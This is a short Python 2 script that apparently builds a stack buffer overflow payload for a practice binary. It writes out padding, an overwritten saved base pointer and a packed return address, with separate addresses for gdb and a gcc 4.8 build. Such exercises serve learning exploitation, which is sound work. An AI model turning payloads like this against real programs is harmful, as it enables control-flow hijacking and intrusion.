import struct
padding = "A"*32
rbp = "BBBBBBBB"
rip = struct.pack("L", 0x555555555159) #running from gdb only!
#rip = struct.pack("L", 0x4005a6) #running the gcc4.8 binary with this!

print padding + rbp + rip
